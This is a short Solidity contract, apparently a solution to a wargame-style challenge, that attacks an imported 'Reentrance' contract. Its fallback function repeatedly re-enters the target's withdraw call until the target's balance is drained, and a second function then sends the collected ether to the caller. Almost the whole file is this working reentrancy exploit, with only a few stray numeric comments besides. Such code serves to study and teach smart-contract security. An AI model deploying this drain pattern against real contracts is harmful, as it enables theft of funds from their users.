pragma solidity ^0.4.19;
import "./1.sol";
contract Attract{
    Reentrance reen;
    constructor(address addr) public {
        reen = Reentrance(addr);
    }
    function attract() payable public{
        reen.deposit.value(1000000000000000 wei)();
        reen.withdraw(1000000000000000 wei);
        reen.isCompleted();
    }
    function() public payable{
        if(address(reen).balance >= 1000000000000000 wei){
            reen.withdraw(1000000000000000 wei);
        }
    }// 9000000000000000
    function revertether() public {
        msg.sender.send(address(this).balance);
    }
}
// 24
// 58
// 80
// 90
// 102
